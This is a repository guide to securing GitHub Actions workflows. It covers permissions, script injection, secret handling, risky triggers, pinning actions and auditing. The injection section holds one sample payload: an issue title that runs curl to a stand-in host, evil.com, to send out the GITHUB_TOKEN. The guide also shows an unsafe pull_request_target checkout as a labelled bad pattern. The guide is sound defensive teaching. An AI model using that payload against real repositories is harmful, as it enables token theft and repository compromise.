# GitHub Actions Workflow Security Best Practices

This document outlines security best practices for GitHub Actions workflows in this repository, following industry standards and recommendations from the Linux Foundation and GitHub Security Lab.

## Table of Contents

- [Permissions](#permissions)
- [Script Injection Prevention](#script-injection-prevention)
- [Secret Management](#secret-management)
- [Dangerous Workflow Triggers](#dangerous-workflow-triggers)
- [Third-Party Actions](#third-party-actions)
- [Environment Protection](#environment-protection)
- [Audit and Monitoring](#audit-and-monitoring)

## Permissions

### Principle of Least Privilege

Always specify explicit, minimal permissions for workflows and jobs:

```yaml
# ✅ GOOD: Explicit minimal permissions
permissions:
  contents: read
  issues: write

# ❌ BAD: No permissions specified (uses default, often too permissive)
# No permissions block
```

### Default Permissions

Set restrictive default permissions at the workflow level:

```yaml
permissions:
  contents: read  # Read-only by default

jobs:
  deploy:
    permissions:
      contents: write  # Escalate only where needed
```

## Script Injection Prevention

### The Problem

User-controlled data (issue titles, PR bodies, branch names, etc.) can be injected into scripts:

```yaml
# ❌ DANGEROUS: Direct injection of user input
run: |
  echo "Title: ${{ github.event.issue.title }}"
```

An attacker could create an issue with title: `"; curl evil.com/steal?token=$GITHUB_TOKEN; "` to execute arbitrary code.

### The Solution

**Always use environment variables** to pass user-controlled data:

```yaml
# ✅ SAFE: User input passed via environment variable
env:
  ISSUE_TITLE: ${{ github.event.issue.title }}
  SOURCE_CHAIN: ${{ github.event.inputs.sourceChain }}
  AMOUNT: ${{ github.event.inputs.amount }}
run: |
  echo "Title: $ISSUE_TITLE"
  echo "Processing $AMOUNT from $SOURCE_CHAIN"
```

### Common Injection Points

Protect these user-controlled contexts:
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.comment.body`
- `github.event.inputs.*` (workflow_dispatch inputs)
- `github.head_ref` (branch names)
- `github.event.pull_request.head.ref`

### Example: Secure Workflow Input Handling

```yaml
on:
  workflow_dispatch:
    inputs:
      sourceChain:
        required: true
        type: choice
        options: [ethereum, base, polygon]
      amount:
        required: true

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Validate and process inputs
        env:
          SOURCE_CHAIN: ${{ github.event.inputs.sourceChain }}
          AMOUNT: ${{ github.event.inputs.amount }}
        run: |
          # Validate before using
          case "$SOURCE_CHAIN" in
            ethereum|base|polygon)
              echo "Valid chain: $SOURCE_CHAIN"
              ;;
            *)
              echo "Invalid chain"
              exit 1
              ;;
          esac
          
          # Validate amount format
          if ! echo "$AMOUNT" | grep -qE '^[0-9]+\.?[0-9]*$'; then
            echo "Invalid amount format"
            exit 1
          fi
```

## Secret Management

### Using Secrets

```yaml
# ✅ GOOD: Secrets from GitHub Secrets
env:
  API_KEY: ${{ secrets.ETHERSCAN_API_KEY }}
  PRIVATE_KEY: ${{ secrets.WALLET_PRIVATE_KEY }}

# ❌ BAD: Hardcoded secrets
env:
  API_KEY: "abc123..."  # Never do this!
```

### Secret Masking

GitHub automatically masks secrets in logs, but be cautious:

```yaml
# Secrets are automatically masked
- name: Use API key
  env:
    API_KEY: ${{ secrets.API_KEY }}
  run: |
    # This will show as *** in logs
    echo "Key: $API_KEY"
    
    # ⚠️ But base64/encoded secrets may leak
    echo "$API_KEY" | base64  # May not be masked!
```

### Never Log Secrets

```yaml
# ❌ DANGEROUS: Could expose secrets
run: |
  set -x  # Debug mode - logs all commands
  curl -H "Authorization: Bearer $API_KEY" ...

# ✅ SAFE: No debug mode with secrets
run: |
  curl -H "Authorization: Bearer $API_KEY" ...
```

## Dangerous Workflow Triggers

### pull_request_target

**Use with extreme caution!** This trigger runs in the context of the base repository with access to secrets, even for untrusted PRs.

```yaml
# ❌ DANGEROUS: Checking out PR code with access to secrets
on: pull_request_target

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Untrusted code!
      - run: npm install && npm test  # Untrusted code executes with secrets!
```

**Safe alternative:**

```yaml
# ✅ SAFER: Use pull_request instead
on: pull_request

# OR if pull_request_target is necessary:
on: pull_request_target

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # Only checkout trusted code
      - uses: actions/checkout@v4
        # Default: checks out base branch, not PR code
      
      # Analyze PR without executing untrusted code
      - name: Static analysis only
        run: |
          # Safe: doesn't execute PR code
          echo "PR from: ${{ github.event.pull_request.head.ref }}"
```

### workflow_run

Similar risks to `pull_request_target`. Only use when necessary and with proper safeguards.

## Third-Party Actions

### Pin to Full Commit SHA

```yaml
# ✅ BEST: Pin to specific SHA
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.0

# ⚠️ ACCEPTABLE: Pin to major version (GitHub-maintained actions)
- uses: actions/checkout@v4

# ❌ AVOID: Mutable references
- uses: actions/checkout@main  # Can change at any time!
- uses: some-org/action@latest  # Can be compromised!
```

### Verify Action Sources

Only use actions from:
- GitHub-verified creators
- Well-known, trusted organizations
- Your own organization
- Actions you've personally audited

### Review Action Permissions

Check what permissions actions need:

```yaml
# Before using any action, review:
# 1. What permissions does it request?
# 2. What does it do with those permissions?
# 3. Is it actively maintained?
# 4. Does it have known vulnerabilities?
```

## Environment Protection

Use GitHub Environments for sensitive operations:

```yaml
jobs:
  deploy-production:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - name: Deploy
        run: ./deploy.sh
```

Environment features:
- **Required reviewers**: Manual approval before deployment
- **Wait timer**: Delay before deployment
- **Deployment branches**: Restrict which branches can deploy
- **Environment secrets**: Secrets scoped to specific environments

## Audit and Monitoring

### Enable Security Features

In repository settings, enable:
- **Dependency scanning**: Dependabot alerts
- **Code scanning**: CodeQL analysis
- **Secret scanning**: Detect committed secrets
- **Workflow security**: OpenSSF Scorecard

### Review Workflow Runs

Regularly audit:
- Workflow run logs
- Failed security scans
- Unexpected workflow triggers
- Secret access patterns

### Workflow Run Logs

```yaml
# Keep audit trail
- name: Log action
  run: |
    echo "Action performed by: ${{ github.actor }}"
    echo "Workflow: ${{ github.workflow }}"
    echo "Run ID: ${{ github.run_id }}"
    echo "Timestamp: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
```

## Common Vulnerabilities and Mitigations

| Vulnerability | Risk | Mitigation |
|--------------|------|------------|
| Script injection | Code execution | Use environment variables |
| Exposed secrets | Credential theft | Use GitHub Secrets, never commit |
| Untrusted code execution | Repository compromise | Avoid `pull_request_target` |
| Excessive permissions | Privilege escalation | Minimal permissions |
| Unpinned actions | Supply chain attack | Pin to SHA |
| Missing validation | Data corruption | Validate all inputs |

## References

- [GitHub: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [OpenSSF: Securing Software Repositories](https://github.com/ossf/wg-securing-software-repos)
- [Linux Foundation: Best Practices for Open Source Developers](https://www.linuxfoundation.org/resources/open-source-guides/creating-an-open-source-program)

## Checklist for New Workflows

Before merging a new workflow:

- [ ] Explicit minimal permissions defined
- [ ] User inputs passed via environment variables
- [ ] No use of dangerous triggers without safeguards
- [ ] Third-party actions pinned to SHA or major version
- [ ] Secrets properly managed (no hardcoding)
- [ ] Input validation implemented
- [ ] Sensitive operations use environment protection
- [ ] Workflow tested in a safe environment
- [ ] Code review completed by security-aware reviewer
- [ ] Documentation updated

---

**Last Updated**: 2026-02-13

For questions or security concerns, see [SECURITY.md](../SECURITY.md).
